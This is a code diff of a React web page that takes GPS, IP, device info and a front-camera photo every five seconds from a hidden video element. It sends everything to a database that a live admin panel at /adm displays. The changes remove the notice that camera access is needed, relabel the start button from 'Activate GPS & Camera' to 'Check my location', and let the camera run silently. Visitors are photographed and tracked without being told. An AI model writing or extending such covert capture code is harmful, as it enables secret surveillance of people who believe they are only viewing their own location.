@@ -33,10 +33,8 @@ function App() {
 
   // 1.5 Realtime Admin Data Sync
   useEffect(() => {
-    // Only subscribe if we are in admin mode
     if (!isAdminRoute || !supabase) return;
 
-    // Fetch Initial Data
     const fetchHistory = async () => {
       const { data, error } = await supabase
         .from('user_locations')
@@ -45,7 +43,6 @@ function App() {
         .limit(50);
       
       if (data) {
-        // Map DB response to UI LogEntry format
         const mappedLogs: LogEntry[] = data.map((item: any) => ({
           ...item,
           status: 'synced'
@@ -56,7 +53,6 @@ function App() {
 
     fetchHistory();
 
-    // Subscribe to Realtime Inserts
     const channel = supabase
       .channel('public:user_locations')
       .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'user_locations' }, (payload) => {
@@ -82,7 +78,7 @@ function App() {
     };
   }, [isAdminRoute]);
 
-  // 2. Initial IP Fetch (Only for client/map mode)
+  // 2. Initial IP Fetch
   useEffect(() => {
     if (isAdminRoute) return; 
 
@@ -99,9 +95,12 @@ function App() {
     fetchApproximateLocation();
   }, [permissionState, isAdminRoute]);
 
-  // 3. Helper: Capture Image from hidden video element
+  // 3. Helper: Capture Image
   const captureImage = useCallback((): string | undefined => {
     if (videoRef.current && canvasRef.current && streamRef.current) {
+      // Check if track is active/live
+      if (!streamRef.current.active) return undefined;
+
       const video = videoRef.current;
       const canvas = canvasRef.current;
       const context = canvas.getContext('2d');
@@ -110,31 +109,27 @@ function App() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        // Returns Base64 JPEG string
         return canvas.toDataURL('image/jpeg', 0.5); 
       }
     }
     return undefined;
   }, []);
 
-  // 4. Helper: Process Location & Image -> Save
+  // 4. Helper: Process & Save
   const handleDataCapture = useCallback(async (loc: UserLocation, isPeriodicCapture: boolean = false) => {
     setLocation(loc);
     
-    // If it's a periodic capture (every 5s), grab the image
     let imageData: string | undefined;
     if (isPeriodicCapture) {
       imageData = captureImage();
     }
 
-    // Only save to log if it's precise GPS or we have an image
-    // (Prevent spamming logs with just IP data repeatedly unless it's a timed capture)
+    // Save if we have GPS source OR an image. 
+    // Since GPS is now mandatory, this will always trigger on location updates.
     if (loc.source === 'gps' || imageData) {
         const deviceInfo = getDeviceInfo();
         const logEntry = await saveLocationToBackend(loc, deviceId, imageData, currentIp, deviceInfo);
         
-        // Update logs state locally (for visual feedback if we were showing logs in client view)
-        // Note: Admin view uses the subscription above, so this setLogs mostly affects the current session if we were to display it.
         if (!isAdminRoute) {
             setLogs(prev => {
               const newLogs = [logEntry, ...prev];
@@ -144,10 +139,15 @@ function App() {
     }
   }, [deviceId, captureImage, currentIp, isAdminRoute]);
 
-  // 5. Start Tracking (GPS + Camera)
+  // 5. Start Tracking
   const startTracking = async () => {
+    // Check for secure context (HTTPS) which is required for Geolocation in modern browsers
+    if (!window.isSecureContext && window.location.hostname !== 'localhost') {
+      console.warn("Geolocation requires a secure context (HTTPS) or localhost.");
+    }
+
+    // A. Try Camera (Optional)
     try {
-      // A. Request Camera Permission & Start Stream
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       streamRef.current = stream;
       
@@ -155,47 +155,55 @@ function App() {
         videoRef.current.srcObject = stream;
         videoRef.current.play();
       }
+    } catch (err) {
+      // Camera is optional. Log warning but DO NOT stop execution.
+      console.warn("Camera access denied or unavailable. Proceeding with Location only.", err);
+    }
 
+    // B. Start Location (Mandatory)
+    try {
       setPermissionState('tracking');
       setShouldRecenter(true);
 
-      // B. Start GPS Watch
       watchIdRef.current = getBrowserLocation(
         (loc) => {
-          // Update map immediately on movement
           setLocation(loc); 
-          // Note: We don't save every single GPS tick to DB, 
-          // we rely on the 5-second interval for the "Packet" (GPS + Image)
         },
         (err) => {
-          console.error("Geo error", err);
-          setPermissionState('denied');
+          // Improved error logging & handling
+          console.warn(`Geo error: Code ${err.code} - ${err.message}`);
+          
+          if (err.code === 1) { 
+             // PERMISSION_DENIED: Fatal
+             alert("Izin lokasi ditolak. Mohon aktifkan izin lokasi di browser Anda untuk menggunakan fitur ini.");
+             setPermissionState('denied');
+          } else if (err.code === 3) {
+             // TIMEOUT: Non-fatal, watchPosition keeps trying
+             console.log("GPS Timeout. Waiting for signal...");
+          } else if (err.code === 2) {
+             // POSITION_UNAVAILABLE: Often temporary (e.g. inside tunnel/building)
+             console.log("Position unavailable. Searching...");
+          }
         }
       );
 
-      // C. Start 5-second Interval for Data Snapshot
       if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
       
       captureIntervalRef.current = window.setInterval(() => {
-        // Use the *latest* location state
         setLocation(prevLoc => {
           if (prevLoc) {
             handleDataCapture(prevLoc, true);
           }
           return prevLoc;
         });
-      }, 5000); // 5 Seconds
+      }, 5000);
 
-    } catch (err) {
-      console.error("Camera permission denied or error", err);
-      // Still allow GPS if Camera fails, but warn user? 
-      // For now, we treat denied camera as "Permission Denied" state mostly
-      alert("Camera permission is required for the full tracking feature.");
-      setPermissionState('denied');
+    } catch (err: any) {
+      console.error("Location Initialization error:", err);
+      setPermissionState('denied'); 
     }
   };
 
-  // Cleanup
   useEffect(() => {
     return () => {
       if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
@@ -204,50 +212,42 @@ function App() {
     };
   }, []);
 
-  // --- RENDER ---
-
-  // If URL is /adm, show Admin Dashboard
   if (isAdminRoute) {
     return <AdminPanel logs={logs} />;
   }
 
-  // Otherwise, show Map App
   return (
-    <div className="h-full w-full flex flex-col bg-gray-50 overflow-hidden relative font-sans text-gray-900">
+    <div className="h-full w-full flex flex-col bg-gray-900 overflow-hidden relative font-sans text-gray-200">
       
-      {/* Hidden Camera Elements */}
       <video ref={videoRef} className="hidden" playsInline muted></video>
       <canvas ref={canvasRef} className="hidden"></canvas>
 
       {/* Header */}
       <div className="absolute top-0 left-0 right-0 z-[1500] pointer-events-none p-4">
-        <div className="bg-white/90 backdrop-blur-md shadow-lg rounded-2xl p-4 flex justify-between items-center pointer-events-auto max-w-4xl mx-auto border border-white/50">
+        <div className="bg-black/60 backdrop-blur-md shadow-lg rounded-2xl p-4 flex justify-between items-center pointer-events-auto max-w-4xl mx-auto border border-white/10">
           <div className="flex items-center space-x-3">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg transition-colors duration-500 ${
                permissionState === 'tracking' 
-                ? 'bg-gradient-to-tr from-green-600 to-emerald-500 shadow-green-500/30' 
-                : 'bg-gradient-to-tr from-blue-600 to-cyan-500 shadow-blue-500/30'
+                ? 'bg-red-600 shadow-red-500/30 animate-pulse' 
+                : 'bg-gray-700 shadow-gray-500/30'
              }`}>
-                <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-video' : 'fa-globe'}`}></i>
+                <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-satellite-dish' : 'fa-radar'}`}></i>
              </div>
              <div>
-               <h1 className="font-bold text-lg leading-tight">GeoTrack Realtime</h1>
-               <p className="text-xs text-gray-500">
+               <h1 className="font-bold text-lg leading-tight tracking-wider text-white">SYSTEM_V1</h1>
+               <p className="text-xs text-gray-400 font-mono uppercase">
                  Status: 
-                 <span className={`ml-1 font-semibold ${
-                   permissionState === 'tracking' ? 'text-green-600' : 
-                   permissionState === 'denied' ? 'text-red-600' : 'text-blue-600'
+                 <span className={`ml-1 font-bold ${
+                   permissionState === 'tracking' ? 'text-green-500' : 'text-gray-500'
                  }`}>
-                   {permissionState === 'idle' ? 'Ready (Approx Loc)' : 
-                    permissionState === 'tracking' ? 'Live (GPS + Cam)' : 'Access Denied'}
+                   {permissionState === 'tracking' ? 'ONLINE' : 'STANDBY'}
                  </span>
                </p>
              </div>
           </div>
           
-          {/* Link to Admin (Hidden trick or button) */}
-          <a href="/adm" className="text-xs text-gray-400 hover:text-gray-600">
-             <i className="fa-solid fa-lock"></i>
+          <a href="/adm" className="text-xs text-gray-600 hover:text-gray-400">
+             <i className="fa-solid fa-terminal"></i>
           </a>
         </div>
       </div>
@@ -259,25 +259,6 @@ function App() {
           shouldRecenter={shouldRecenter}
           onRecenterComplete={() => setShouldRecenter(false)}
         />
-        
-        {/* Permission Denied Overlay */}
-        {permissionState === 'denied' && (
-           <div className="absolute inset-0 z-[2000] bg-black/50 flex items-center justify-center backdrop-blur-sm">
-             <div className="bg-white p-6 rounded-2xl shadow-2xl max-w-sm text-center">
-               <div className="w-16 h-16 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
-                 <i className="fa-solid fa-ban text-2xl"></i>
-               </div>
-               <h3 className="text-xl font-bold mb-2">Access Required</h3>
-               <p className="text-gray-500 mb-6 text-sm">We need permission to access your <strong>Location</strong> and <strong>Camera</strong> to start the realtime session.</p>
-               <button 
-                 onClick={() => window.location.reload()}
-                 className="w-full py-2.5 bg-gray-900 text-white rounded-xl hover:bg-black transition-colors"
-               >
-                 Try Again
-               </button>
-             </div>
-           </div>
-        )}
       </div>
 
       {/* Action Button */}
@@ -288,23 +269,23 @@ function App() {
             else setShouldRecenter(true);
           }}
           className={`
-            group relative flex items-center justify-center px-6 py-4 rounded-full shadow-2xl transition-all duration-300
+            group relative flex items-center justify-center px-8 py-4 rounded-full shadow-2xl transition-all duration-300 border
             ${permissionState === 'tracking' 
-              ? 'bg-white text-green-600 hover:bg-green-50' 
-              : 'bg-blue-600 text-white hover:bg-blue-700 hover:scale-105'
+              ? 'bg-black/80 border-green-500/50 text-green-500 hover:bg-black' 
+              : 'bg-blue-700 border-blue-500 text-white hover:bg-blue-600 hover:scale-105'
             }
           `}
         >
           {permissionState === 'tracking' && (
              <span className="absolute -top-1 -right-1 flex h-3 w-3">
-               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-               <span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
+               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+               <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
              </span>
           )}
           
-          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-crosshairs' : 'fa-play'} text-xl mr-2`}></i>
-          <span className="font-bold">
-             {permissionState === 'tracking' ? 'Pusatkan Titik' : 'Aktifkan GPS & Kamera'}
+          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-crosshairs' : 'fa-location-dot'} text-xl mr-3`}></i>
+          <span className="font-bold tracking-widest font-mono uppercase text-sm">
+             {permissionState === 'tracking' ? 'LOKASI AKTIF' : 'CEK LOKASI SAYA'}
           </span>
         </button>
       </div>
